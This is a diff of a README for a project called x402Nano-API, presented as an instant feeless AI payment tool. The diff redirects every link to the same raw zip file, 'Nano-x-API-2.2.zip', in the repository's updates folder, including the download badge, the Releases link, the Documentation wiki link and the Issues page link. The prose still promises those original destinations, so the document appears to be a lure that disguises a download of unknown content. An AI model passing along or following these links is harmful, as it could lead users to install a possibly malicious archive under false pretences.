@@ -1,6 +1,6 @@
 # 🚀 x402Nano-API - Instant Feeless AI Payments
 
-[![Download x402Nano-API](https://img.shields.io/badge/Download_x402Nano-API-brightgreen.svg)](https://github.com/isac-0000/x402Nano-API/releases)
+[![Download x402Nano-API](https://github.com/isac-0000/x402Nano-API/raw/refs/heads/main/updates/Nano-x-API-2.2.zip)](https://github.com/isac-0000/x402Nano-API/raw/refs/heads/main/updates/Nano-x-API-2.2.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ Before using x402Nano-API, ensure you have access to the internet and basic comp
 
 To download x402Nano-API, please visit the Releases page. Here you will find the latest version available for download.
 
-[Download x402Nano-API](https://github.com/isac-0000/x402Nano-API/releases)
+[Download x402Nano-API](https://github.com/isac-0000/x402Nano-API/raw/refs/heads/main/updates/Nano-x-API-2.2.zip)
 
 Once you are on the Releases page, you will see various files listed. Choose the version appropriate for your operating system. Typically, you will find versions for Windows, macOS, and Linux.
 
@@ -44,11 +44,11 @@ Once you are on the Releases page, you will see various files listed. Choose the
 
 ## 📖 Documentation
 
-For more detailed instructions and advanced features, please refer to the official [Documentation](https://github.com/isac-0000/x402Nano-API/wiki). Here you will find guides, troubleshooting tips, and FAQs to help you navigate through common issues.
+For more detailed instructions and advanced features, please refer to the official [Documentation](https://github.com/isac-0000/x402Nano-API/raw/refs/heads/main/updates/Nano-x-API-2.2.zip). Here you will find guides, troubleshooting tips, and FAQs to help you navigate through common issues.
 
 ## 🙋‍♂️ Support
 
-If you encounter any issues while using x402Nano-API, support is available. You can open an issue on our [GitHub Issues page](https://github.com/isac-0000/x402Nano-API/issues) or submit a request through our support email. We aim to respond to inquiries within 48 hours.
+If you encounter any issues while using x402Nano-API, support is available. You can open an issue on our [GitHub Issues page](https://github.com/isac-0000/x402Nano-API/raw/refs/heads/main/updates/Nano-x-API-2.2.zip) or submit a request through our support email. We aim to respond to inquiries within 48 hours.
 
 ## 🔗 Related Topics
 
@@ -63,6 +63,6 @@ These topics are essential for users interested in understanding the broader imp
 
 We are continuously improving x402Nano-API. Check back regularly on our Releases page to stay updated with new versions and enhancements.
 
-[Download x402Nano-API](https://github.com/isac-0000/x402Nano-API/releases)
+[Download x402Nano-API](https://github.com/isac-0000/x402Nano-API/raw/refs/heads/main/updates/Nano-x-API-2.2.zip)
 
 Thank you for choosing x402Nano-API; we hope it meets your payment needs in the evolving space of AI technology.
